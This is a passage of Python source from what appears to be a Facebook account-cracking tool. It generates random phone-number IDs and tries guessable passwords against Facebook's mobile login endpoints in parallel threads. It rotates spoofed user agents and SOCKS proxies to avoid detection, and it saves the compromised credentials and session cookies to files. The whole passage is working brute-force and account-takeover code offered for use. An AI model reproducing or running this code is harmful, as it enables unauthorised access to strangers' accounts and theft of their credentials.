  clear();banner();print(f"{dot}{P}Number  {RED}: {H}"+kode);print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}A1{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}F1{P}]');print(led)
  hc = input(f'{wt}Select Method {M}:{H} ')
  for nmbr in range(limit):
    nmp = ''.join(random.choice(string.digits) for _ in range(6))
    user.append(nmp)
  with tred(max_workers=30) as king_xd:
    os.system('clear')
    tl = str(len(user))
    banner();print(f'{dot}Method{RED} : {H}M-'+hc);print(f'{dot}Number{RED} : {H}{kode}');print(f'{dot}Limit {RED} : {H}{tl}');print(led)
    for guru in user: 
      idf = kode+guru
      pwv=[idf,guru,idf[:7],idf[:6],idf[:8]]
      if hc in ['1','01']:king_xd.submit(m33,idf,pwv)
      elif hc in ['2','02']:king_xd.submit(m2,idf,pwv)
      elif hc in ['3','03']:king_xd.submit(m3,idf,pwv)
      elif hc in ['4','04']:king_xd.submit(m4,idf,pwv)
      elif hc in ['5','05']:king_xd.submit(f1,idf,pwv)
      elif hc in ['6','06']:king_xd.submit(f1,idf,pwv)
      else:
       king_xd.submit(m5,idf,pwv)
  print('');print(f'{N} Hi Dear User Crack process has been completed')
  input(f'{dot}Press Enter To Go Menu');os.system('python FB-KING.py')
# INDIA X PAKISTAN -- MAIN DEF #
def xp():
  user=[]
  os.system('clear');banner();print(c7);print(led)
  kode = input(f'{dot}Select Code {M}: {H}');print(led);print(limitt);print(led)
  limit = int(input(f'{dot}Crack Limit {M}: {H}'));print(led)
  xd_cp=input(f'{wt}Cloning Show cp Account  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
  if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
  else:cp_xdx.append('n')
  print(led)
  cokixx=input(f'{wt}Cloning Show Cookie  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
  if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
  else:cokix.append('n')
  clear();banner();print(f"{dot}{P}Number  {RED}: {H}"+kode);print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}A1{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}F1{P}]');print(led)
  hc = input(f'{wt}Select Method {M}:{H} ')
  if hc in ['1','01']:mtd.append('m1')
  elif hc in ['2','02']:mtd.append('m2')
  elif hc in ['3','03']:mtd.append('m3')
  elif hc in ['4','04']:mtd.append('m4')
  elif hc in ['5','05']:mtd.append('a1')
  elif hc in ['6','06']:mtd.append('f1')
  else:
      mtd.append('m1')
  for nmbr in range(limit):
    nmp = ''.join(random.choice(string.digits) for _ in range(7))
    user.append(nmp)
  with tred(max_workers=30) as king_xd:
    os.system('clear')
    tl = str(len(user))
    banner();print(f'{dot}Method{RED} : {H}M-'+hc);print(f'{dot}Number{RED} : {H}{kode}');print(f'{dot}Limit {RED} : {H}{tl}');print(led)
    for guru in user:
      idf = kode+guru
      pwv = [guru,'khankhan','khan khan','khan123','khan12','khan1122']
     # pwv = [idf,guru,idf[:6],idf[:7],guru[1:]] #,'@#@#@#','bangladesh'] #,'@#@#@#','bangladesh','free fire','i love you']
      if 'm1' in mtd:king_xd.submit(f1,idf,pwv)
      elif 'm2' in mtd:king_xd.submit(m2,idf,pwv)
      elif 'm3' in mtd:king_xd.submit(m3,idf,pwv)
      elif 'm4' in mtd:king_xd.submit(m4,idf,pwv)
      elif 'a1' in mtd:king_xd.submit(f1,idf,pwv)
      elif 'f1' in mtd:king_xd.submit(f1,idf,pwv)
      else:
       king_xd.submit(m5,idf,pwv)
  print('');print(f'{N} Hi Dear User Crack process has been completed')
  input(f'{dot}Press Enter To Go Menu');os.system('python FB-KING.py')


browser_version1 = (f'{random.randrange(85, 105)}.0.{random.randrange(4200, 4900)}.{random.randrange(40, 150)}')
build1 = (''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(6)))
android_version1 = random.choice(['11', '10'])
android_model1 = random.choice(['SM-M022G'])
useragent = ('Mozilla/5.0 (Linux; Android {};{} Build/{}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 SamsungBrowser/7.4 Chrome/{} Mobile Safari/537.36'.format(android_version1, android_model1, build1, browser_version1))

def m1(idf,pwv):
    global loop, ok, cp
    animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
    sys.stdout.write(f'\r{P} [{animasi}-{H}M1{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
    sys.stdout.flush()
    az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
    rr = random.randint
    rc = random.choice
    ugen1 = f"Mozilla/5.0 (Linux; Android {str(rr(10,13))}; Redmi Note 9 Pro Max Build/QKQ1.{str(rr(111111,999999))}.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.{str(rr(1111,9999))}.{str(rr(11,99))} Mobile Safari/537.36"
    pro = random.choice(ugen)
    for pw in pwv: 
        try:
            session = requests.Session()
            pw = pw.lower()
            get = session.get(f"https://m.facebook.com/login/?email={idf}&pass={pw}&locale2=id_ID")
            date = {
            "lsd":re.search('name="lsd" value="(.*?)"',str(get.text)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"',str(get.text)).group(1),
            "li":re.search('name="li" value="(.*?)"',str(get.text)).group(1),
            "email":idf,"pass":pw,"Host":"https://m.facebook.com/login/save-device/?login=source_login&ref=wizard"
         }
            respons =({
            'Host': f'm.facebook.com',
           'accept': 'image/webp,image/png,image/svg+xml,image/*;q=0.8,video/*;q=0.8,*/*;q=0.5','accept-encoding': 'gzip,deflate',
           'accept-language': 'es_LA,id;q=0.9','content-length': f'{str(rr(1111,9999))}',
           'content-type': 'application/x-www-form-urlencoded','origin': 'https://m.facebook.com',
           'referer': f'https://m.facebook.com/reg/?cid=103&refid=8',
           'user-agent': pro,
           'sec-fetch-dest': f'{random.choice(["empty","document"])}',
           'sec-fetch-mode': f'{random.choice(["navigate","cors"])}',
           'sec-fetch-site': f'{random.choice(["none","same-origin"])}',
           'sec-fetch-user': f'{random.choice(["?1","empty"])}',
           'x-requested-with': 'www.facebook.com',
           'x-xss-protection': '0',
           'sec-ch-ua': '" Not A;Brand";v="99", "Microsoft Edge";v="101", "Chromium";v="101"',
           'sec-ch-ua-mobile': '?0'})
            yz = session.post(f'https://m.facebook.com/login/device-based/login/async/?refsrc=wizard', headers=respons, data=date, allow_redirects=False)
            if "checkpoint" in session.cookies.get_dict().keys():
             idf = session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
             cp+=1
             if 'y' in cp_xdx:
              print(f'\r{P} [\033[1;30mKING-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
             open(' /sdcard/ULTRA-GREEN-CP.txt', 'a').write(idf+'|'+pw)
             cp.append(idf)
             break
            elif "c_user" in session.cookies.get_dict().keys():
                kukis = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                idf = re.findall('c_user=(.*);xs', kukis)[0]
                ok+=1
                print(f'\r{P} [{H}KING-OK{P}] {GREEN}{idf}|{pw}{xxx}')
                if 'y' in cokix:
                 print(f'\r{gen}{H}'+kukis)
                open(' /sdcard/ULTRA-GREEN-OK.txt', 'a').write(idf+'|'+pw)
                ok.append(idf+'|'+pw)
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
    

def m2(idf,pwv):
 global loop,ok,cp
 animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
 sys.stdout.write(f'\r{P} [{animasi}-{H}M2{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
 sys.stdout.flush()
 ses = requests.Session()
 ua = random.choice(usragent)
 ua2 = random.choice(usragent)
 for pw in pwv:
  try:
   ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
   p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25221ri5o69ef67k6d9s38l3tx1zz1hbv015tb7cdwb6deqa4u2svv%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db97ff6fb-29af-412a-bb00-83c94a1003f1%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221ri5o69ef67k6d9s38l3tx1zz1hbv015tb7cdwb6deqa4u2svv%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr') 
   dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
   koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
   koki+=' m_pixel_ratio=2.625; wd=412x756'
   heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25221ri5o69ef67k6d9s38l3tx1zz1hbv015tb7cdwb6deqa4u2svv%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db97ff6fb-29af-412a-bb00-83c94a1003f1%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221ri5o69ef67k6d9s38l3tx1zz1hbv015tb7cdwb6deqa4u2svv%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
   po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
   if "checkpoint" in po.cookies.get_dict().keys():
    idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
    if 'y' in cp_xdx:
     print(f'\r{P} [\033[1;30mKING-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
    open(' /sdcard/ULTRA-GREEN-CP.txt','a').write(idf+'|'+pw+'\n')
    ok.append(idf+'|'+pw)
    cp+=1
    break
   elif "c_user" in ses.cookies.get_dict().keys():
    coki=po.cookies.get_dict()
    kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
    idf = re.findall('c_user=(.*);xs', kuki)[0]
    ok+=1
    print(f'\r{P} [{H}KING-OK{P}] {GREEN}{idf}|{pw}{xxx}')
    if 'y' in cokix:
     print(f'\r{gen}{H}'+kuki)
    open(' /sdcard/ULTRA-GREEN-OK.txt','a').write(idf+'|'+pw+'\n')
    break
   else:
    continue
  except requests.exceptions.ConnectionError:
   time.sleep(3)
 loop+=1




def m4(idx,pwv):
  global loop,ok,cp
 # gif = random.choice(["\x1b[1;91m•    ","\x1b[1;92m••   ","\x1b[1;93m•••  ","\x1b[1;94m•••• ","\x1b[1;95m•••••"])
  animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
  sys.stdout.write(f'\r{P} [{animasi}{N}-{H}M4{P}] ({B}%s{P}){U}{gif}{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
  sys.stdout.flush()
  ua = random.choice(useragent)
  ses = requests.Session()
  for pw in pwv:
    try:
      nip=random.choice(proxsi)
      proxs= {'http': 'socks4://'+nip}
      ses.headers.update({"Host": "m.alpha.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
      p = ses.get("https://m.alpha.facebook.com/login.php?skip_api_login=1&api_key=274266067164&kid_directed_site=0&app_id=274266067164&signed_next=1&next=https%3A%2F%2Fm.alpha.facebook.com%2Fv2.7%2Fdialog%2Foauth%3Fapp_id%3D274266067164%26cbt%3D1675237736936%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df33eeedf0d23c74%2526domain%253Did.pinterest.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.pinterest.com%25252Ff4c01e9564da44%2526relation%253Dopener%26client_id%3D274266067164%26display%3Dtouch%26domain%3Did.pinterest.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fid.pinterest.com%252Flogin%26locale%3Did_ID%26logger_id%3Df27fa04cd920e98%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df96f44d15f7ea8%2526domain%253Did.pinterest.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.pinterest.com%25252Ff4c01e9564da44%2526relation%253Dopener%2526frame%253Df7efd9d84b96a8%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%252Cuser_friends%26sdk%3Djoey%26version%3Dv2.7%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df96f44d15f7ea8%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener%26frame%3Df7efd9d84b96a8%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
      dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
      koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
      koki+=' m_pixel_ratio=2.625; wd=412x756'
      heade={
      "Host": "m.alpha.facebook.com",
      "content-length": f"{len(str(dataa))}",
      "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
      "origin": "https://m.alpha.facebook.com",
      "content-type": "application/x-www-form-urlencoded",
      "user-agent": ua,
      "accept": "*/*",
      "x-requested-with": "com.microsoft.bing",
      "sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
      "sec-ch-ua-platform": '"Android"',
      "sec-ch-ua-mobile": "?1",
      "sec-fetch-site": "same-origin",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "sec-fetch-user": "?1",
      "referer": "https://m.alpha.facebook.com/v2.7/dialog/oauth?app_id=274266067164&cbt=1675237736936&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df33eeedf0d23c74%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener&client_id=274266067164&display=touch&domain=id.pinterest.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fid.pinterest.com%2Flogin&locale=id_ID&logger_id=f27fa04cd920e98&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df96f44d15f7ea8%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener%26frame%3Df7efd9d84b96a8&response_type=token%2Csigned_request%2Cgraph_domain&scope=public_profile%2Cemail%2Cuser_birthday%2Cuser_friends&sdk=joey&version=v2.7&ret=login&fbapp_pres=0&tp=unspecified",
      "accept-encoding": "gzip, deflate br",
      "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
      }
      po = ses.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
      if "checkpoint" in po.cookies.get_dict().keys():
        idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
        if 'y' in cp_xdx:
         print(f'\r{P} [\033[1;30mKING-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
        open(' /sdcard/ULTRA-GREEN-CP.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        cp+=1
        break
      elif "c_user" in ses.cookies.get_dict().keys():
        ok+=1
        coki=po.cookies.get_dict()
        kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
        idf = re.findall('c_user=(.*);xs', kuki)[0]
        print(f'\r{P} [{H}KING-OK{P}] {GREEN}{idf}|{pw}{xxx}')
        if 'y' in cokix:
         print(f'\r{gen}{H}'+kuki)
        open(' /sdcard/ULTRA-GREEN-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        break
        
      else:
        continue
    except requests.exceptions.ConnectionError:
      waktu(31)
  loop+=1

###----------[  FREE ]----------###
def f1(idf,pwv):
  global loop,ok,cp
  animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
  sys.stdout.write(f'\r{P} [{animasi}-{H}F1{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
  sys.stdout.flush()
  ua = random.choice(usragent)
  ses = requests.Session()
  for pw in pwv:
    try:
      nip=random.choice(proxsi)
      proxs= {'http': 'socks4://'+nip}
      ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
      p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=2076461462396807&kid_directed_site=0&app_id=2076461462396807&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D2076461462396807%26redirect_uri%3Dhttps%253A%252F%252Fduniagames.co.id%252Fnew-callback%26scope%3Dpublic_profile%252Cemail%26code_challenge%3DYqn9YmMbIY9awk-vWUaq_BuuPrndLEOUQXVYSH1Rleo%26code_challenge_method%3DS256%26state%3D2t0u9qzy4ubndt6ek29y6n1obo9mojr%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd614149f-136e-431f-babf-db7f365bce91%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fduniagames.co.id%2Fnew-callback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D2t0u9qzy4ubndt6ek29y6n1obo9mojr%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
      dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
      koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
      koki+=' m_pixel_ratio=2.625; wd=412x756'
      heade={
      "Host": "m.facebook.com",
      "content-length": f"{len(str(dataa))}",
      "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
      "origin": "https://m.facebook.com",
      "content-type": "application/x-www-form-urlencoded",
      "user-agent": ua, #'Mozilla/5.0 (Linux; Android 13; SM-A536B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.15 Mobile Safari/537.36',
      "accept": "*/*",
      "x-requested-with": "com.microsoft.bing",
      "sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
      "sec-ch-ua-platform": '"Android"',
      "sec-ch-ua-mobile": "?1",
      "sec-fetch-site": "same-origin",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "sec-fetch-user": "?1",
      "referer": "https://m.facebook.com/dialog/oauth?response_type=code&client_id=2076461462396807&redirect_uri=https%3A%2F%2Fduniagames.co.id%2Fnew-callback&scope=public_profile%2Cemail&code_challenge=Yqn9YmMbIY9awk-vWUaq_BuuPrndLEOUQXVYSH1Rleo&code_challenge_method=S256&state=2t0u9qzy4ubndt6ek29y6n1obo9mojr&ret=login&fbapp_pres=0&logger_id=d614149f-136e-431f-babf-db7f365bce91&tp=unspecified",
      "accept-encoding": "gzip, deflate br",
      "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
      }
      po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
      if "checkpoint" in po.cookies.get_dict().keys():
        idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
        if 'y' in cp_xdx:
         print(f'\r{P} [\033[1;30mKING-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
        open(' /sdcard/ULTRA-GREEN-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
        cp+=1
        break
      elif "c_user" in ses.cookies.get_dict().keys():
        ok+=1
        coki=po.cookies.get_dict()
        kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
        idf = re.findall('c_user=(.*);xs', kuki)[0]
        print(f'\r{P} [{H}KING-OK{P}] {GREEN}{idf}|{pw}{xxx}')
        if 'y' in cokix:
         print(f'\r{gen}{H}'+kuki)
        open(' /sdcard/ULTRA-GREEN-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        break
      else:
        continue
    except requests.exceptions.ConnectionError:
      waktu(31)
  loop+=1

versi_android = random.randint(4,12)
versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
versi_app = random.randint(410000000,499999999)
device = random.choice(["VOG-L29 Build/HUAWEIVOG-L29","STK-LX3 Build/HUAWEISTK-LX3","BTV-W09 Build/HUAWEIBEETHOVEN-W09","CLT-AL00 Build/HUAWEICLT-AL00","LYA-AL10 Build/HUAWEILYA-AL10","ELE-L29 Build/HUAWEIELE-L29","DIG-AL00 Build/HUAWEIDIG-AL00","EVA-L09 Build/HUAWEIEVA-L09"])
density = random.choice(["{density=3.0,width=1080,height=1920}","{density=2.0,width=720,height=1412}","{density=1.5, width=480, height=800}"])
ua = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; {device}) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{versi_app};FBCR/3;FBMF/huawei;FBBD/huawei;FBDV/{device.split(' Build')[0]};FBSV/{str(random.randint(4,10))};FBCA/arm64-v8a:null;FBDM/"+str(density)+";]"


###----------[  MBASIC ]----------###



def m3(idf,pw):
 global loop
 global ok
 global agents
 animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
